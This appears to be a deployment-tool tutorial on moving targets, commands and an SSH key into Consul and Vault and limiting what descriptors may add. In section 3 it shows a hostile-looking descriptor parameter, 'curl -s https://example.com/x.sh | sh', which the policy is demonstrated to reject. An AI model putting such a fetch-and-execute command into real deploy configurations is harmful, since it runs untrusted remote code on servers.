# 2. Environments and secrets

!!! abstract "In this tutorial"
    You move targets, commands and credentials out of the descriptor: first into a file, then into **Consul**, with the SSH key in **Vault**. The application team is left with a ten-line descriptor, and a `descriptor_policy` makes sure it cannot ask for more than it should.

    **Time:** 30 minutes · **You need:** the result of [tutorial 1](primo-deploy.md), Docker

## Why

In tutorial 1 the descriptor holds everything: hosts, the destination directory, the commands run on the server and the path of the key. Whoever can change the descriptor can run any command on production. The [environment configuration](../guida/configurazione-ambiente.md) separates the two concerns:

- the **descriptor**, in the application repository, says *what* to release;
- the **environment configuration**, owned by whoever runs the environment, says *where* and *how*. It is authoritative: the descriptor cannot change it.

## 1. Environment configuration in a file

Create the configuration of `hello` in `test`, with what used to be in the descriptor:

```yaml title="envconfig/hello/test.yml"
plugin: remote-copy
targets:
  - {host: 127.0.0.1, port: 2222, user: deploy}
params:
  dest_dir: /opt/hello
  layout: releases
  keep_releases: "3"
  ssh_key_secret: deploy-key
  prepare_command: 'tar -xzf "$MANENT_ARTIFACT" -C "$MANENT_RELEASE_DIR"'
  post_command: '"$MANENT_CURRENT/bin/hello"'
secrets:
  - name: deploy-key
    ref: file:/home/you/manent-tutorial/lab/deploy_key
rollback:
  enabled: true                # the environment enforces rollback
```

Tell manent where to find it, and make it mandatory, so a deploy to an environment without configuration fails instead of relying on the descriptor:

```yaml title="manent.yml (addition)"
envconfig:
  provider: file
  required: true
  file:
    path: "./envconfig/{application}/{environment}.yml"
```

Restart `manent-server -c manent.yml serve`. The descriptor now only says what to release:

```yaml title="hello-min.yml"
apiVersion: manent/v1
application: hello
environment: test
artifact:
  type: application
  name: hello
  version: 1.1.0
  source: /home/you/manent-tutorial/dist/hello-1.1.0.tar.gz
```

```sh
manent validate -f hello-min.yml | jq '{valid, config, rollback}'
```

```json
{
  "valid": true,
  "config": {"source": "file:./envconfig/hello/test.yml", "targets": "1"},
  "rollback": {"enabled": true, "on": ["deploy", "post-test", "activation"], "locator": "plugin"}
}
```

```sh
manent deploy -f hello-min.yml
```

The output of the `config` step records where the configuration came from (`source`): every deploy can be traced back to the exact configuration it used.

## 2. The environment wins

Try to change a value the environment defines:

```yaml title="conflict.yml (hello-min.yml plus)"
deploy:
  params:
    dest_dir: /tmp/elsewhere
```

```sh
manent validate -f conflict.yml
```

```text
invalid request: environment configuration incompatible with the descriptor: deploy.params.dest_dir: value differs between environment configuration and descriptor
```

A conflict is always an error, never a silent overwrite. The descriptor can only *add* what the environment does not define, and the next step limits that too.

## 3. Limit what a descriptor may add

Without limits a descriptor could still add a parameter the environment does not set, for example a `rollback_command`. `descriptor_policy` in `manent.yml` lists what descriptors may add:

```yaml title="manent.yml (addition)"
descriptor_policy:
  params:
    remote-copy: [verify_checksum]          # never commands or directories
  secret_refs: ["vault:secret/data/{application}/*"]
  targets: false                            # targets only from the environment
```

Restart the server and try:

```yaml title="sneaky.yml (hello-min.yml plus)"
deploy:
  params:
    rollback_command: "curl -s https://example.com/x.sh | sh"
```

```sh
manent validate -f sneaky.yml
```

```text
invalid request: descriptor not allowed by the policy: deploy.params.rollback_command cannot be set by the descriptor: it must be defined in the environment configuration (descriptor_policy.params)
```

`hello-min.yml` is still valid. See [Security](../operazioni/sicurezza.md#cosa-puo-chiedere-un-descrittore) for a complete production policy.

## 4. Move the configuration to Consul

Files are fine for development. In production the configuration lives in a system with access control, history and an API: [Consul](../integrazioni/consul.md). Start a development agent:

```sh
docker run -d --name manent-tutorial-consul -p 8500:8500 hashicorp/consul:1.20 agent -dev -client=0.0.0.0
```

The secret reference will point to Vault (next step), so write the Consul version of the configuration with a `vault:` reference:

```yaml title="envconfig/hello/test-consul.yml (only the secrets section changes)"
secrets:
  - name: deploy-key
    ref: "vault:secret/data/hello/test#ssh_key"
```

```sh
docker cp envconfig/hello/test-consul.yml manent-tutorial-consul:/tmp/test.yml
docker exec manent-tutorial-consul consul kv put manent/hello/test @/tmp/test.yml
```

## 5. Put the SSH key in Vault

Start Vault in development mode, with a known root token, and store the key in the KV v2 engine:

```sh
docker run -d --name manent-tutorial-vault -p 8200:8200 -e VAULT_DEV_ROOT_TOKEN_ID=tutorial-root hashicorp/vault:1.18
docker cp lab/deploy_key manent-tutorial-vault:/tmp/deploy_key
docker exec -e VAULT_ADDR=http://127.0.0.1:8200 -e VAULT_TOKEN=tutorial-root manent-tutorial-vault \
  vault kv put secret/hello/test ssh_key=@/tmp/deploy_key
docker exec manent-tutorial-vault rm /tmp/deploy_key
```

!!! warning "Development mode only"
    A dev-mode Vault keeps everything in memory and uses a root token. For a real setup, with AppRole or Kubernetes authentication and a least-privilege policy, follow [HashiCorp Vault](../integrazioni/vault.md).

## 6. Point manent at Consul and Vault

Replace the `envconfig` section and add `secrets.vault`:

```yaml title="manent.yml"
dbos:
  database_url: sqlite:manent.db
workdir: ./work
plugins:
  remote-copy:
    known_hosts: ./lab/known_hosts
envconfig:
  provider: consul
  required: true
  consul:
    address: http://127.0.0.1:8500
    key: "manent/{application}/{environment}"
secrets:
  vault:
    enabled: true
    address: http://127.0.0.1:8200
    auth: token                      # VAULT_TOKEN or token_file
descriptor_policy:
  params:
    remote-copy: [verify_checksum]
  secret_refs: ["vault:secret/data/{application}/*"]
  targets: false
```

```sh
VAULT_TOKEN=tutorial-root manent-server -c manent.yml serve
```

```sh
manent validate -f hello-min.yml | jq -c '{valid, config, secrets}'
```

```json
{"valid": true, "config": {"revision": "18", "source": "consul:manent/hello/test", "targets": "1"}, "secrets": ["deploy-key"]}
```

`revision` is Consul's `ModifyIndex` of the key: it changes every time someone writes the configuration. Release:

```sh
manent deploy -f hello-min.yml --version 1.0.0 --source "$PWD/dist/hello-1.0.0.tar.gz"
```

The `secrets` step checks that `vault:secret/data/hello/test#ssh_key` can be read; the `deploy` step reads it again when it opens the SSH connection. The key never leaves Vault except into the worker's memory.

## What you learned

- The **environment configuration** holds targets, parameters, secret references and policies; the descriptor shrinks to the artifact.
- The environment is **authoritative**: conflicts are errors, and `descriptor_policy` limits what descriptors may add.
- Each deploy records the **source and revision** of the configuration it used, and reads it when it starts, so a scheduled or resumed deploy behaves predictably.
- Secrets live in **Vault**; manent stores only references.

## Next

[Tutorial 3](promozione.md) adds a production environment and the rules that protect it: authentication, roles, promotion, approvals and freezes.
